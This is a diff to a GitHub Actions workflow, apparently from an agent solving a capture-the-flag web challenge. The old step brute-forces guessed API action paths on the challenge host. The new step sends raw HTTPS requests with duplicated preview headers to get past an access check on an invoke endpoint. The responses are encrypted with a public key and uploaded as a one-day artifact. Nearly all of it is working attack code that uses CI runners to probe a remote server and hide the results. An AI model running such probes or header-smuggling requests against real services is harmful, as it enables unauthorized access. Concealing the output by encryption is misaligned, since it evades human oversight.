@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe dynamic paths from public server references
+      - name: Probe duplicate preview headers over raw HTTPS
         shell: bash
         run: |
           set -euo pipefail
@@ -30,34 +30,35 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json,itertools
-          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
-          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; aid=act['id']; ref='preview-8b11c'
-          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
-          vals=[aid,ref,'inspectDeploy','inspect-deploy','inspect_deploy']
-          paths=set()
-          for v in vals:
-            for root in ['/api/action/','/api/actions/','/api/server-action/','/api/server-actions/','/api/reference/','/api/references/','/api/server-reference/','/api/server-references/','/api/runtime/action/','/api/runtime/actions/']:
-              paths.add(root+v); paths.add(root+v+'/invoke'); paths.add(root+v+'/inspect'); paths.add(root+v+'/export')
-          paths.update([f'/api/actions/invoke/{aid}',f'/api/actions/invoke/{ref}',f'/api/actions/{aid}/invoke',f'/api/actions/{ref}/invoke'])
-          hits=[]
-          bodies=[{}, {'workspaceId':boot['workspace'],'projectId':boot['project']},{'actionId':aid,'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},{'deployRef':ref},{'ref':ref}]
-          for path in sorted(paths):
-            u=urllib.parse.urljoin(base,path)
-            for method in ['GET','POST']:
-              try:
-                if method=='GET':
-                  r=s.get(u,headers=h,timeout=8,allow_redirects=False)
-                  if r.status_code!=404:hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                else:
-                  for b in bodies:
-                    r=s.post(u,headers=h,json=b,timeout=8,allow_redirects=False)
-                    if r.status_code!=404:
-                      hits.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-                      if 'caplag{' in r.text: break
-              except Exception: pass
-          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
+          import ssl,socket,json,pathlib,http.client
+          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; port=443
+          out=pathlib.Path('package/out')
+          # constants already published by the same instance
+          aid='act_6f4b9a2c1d0e8a71'; ws='ws-launchlet-public'; project='launchlet-demo-board'
+          body=json.dumps({'actionId':aid,'args':{'workspaceId':ws,'projectId':project}},separators=(',',':')).encode()
+          second=['release','production','prod','enterprise','internal','admin','deploy','deployment','export','publish','final','final-review','enterprise-rollout','preview-8b11c','lrec_preview_demo_2026','2026.05.16-rc3','launchlet-actions/0.9.4']
+          pairs=[]
+          for v in second:
+            pairs.append((project,v)); pairs.append((v,project))
+          pairs += [(project,project),(project,''),(project,'preview')]
+          ctx=ssl.create_default_context(); res=[]
+          for a,b in pairs:
+            try:
+              with socket.create_connection((host,port),timeout=10) as raw:
+                with ctx.wrap_socket(raw,server_hostname=host) as ss:
+                  lines=[
+                    'POST /api/actions/invoke HTTP/1.1',f'Host: {host}','User-Agent: Mozilla/5.0','Accept: application/json','Content-Type: application/json',f'Content-Length: {len(body)}',f'X-Launchlet-Preview: {a}',f'X-Launchlet-Preview: {b}','Connection: close','',''
+                  ]
+                  ss.sendall('\r\n'.join(lines).encode()+body)
+                  data=b''
+                  while True:
+                    c=ss.recv(65536)
+                    if not c: break
+                    data+=c
+              head,_,rb=data.partition(b'\r\n\r\n'); first=head.split(b'\r\n',1)[0].decode('latin1','replace'); status=int(first.split()[1])
+              res.append({'first':a,'second':b,'status':status,'body':rb.decode('utf-8','replace'),'headers':head.decode('latin1','replace')})
+            except Exception as e: res.append({'first':a,'second':b,'error':repr(e)})
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -73,6 +74,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-dynamic-paths-encrypted
+          name: launchlet-part2-duplicate-header-encrypted
           path: artifact/
           retention-days: 1
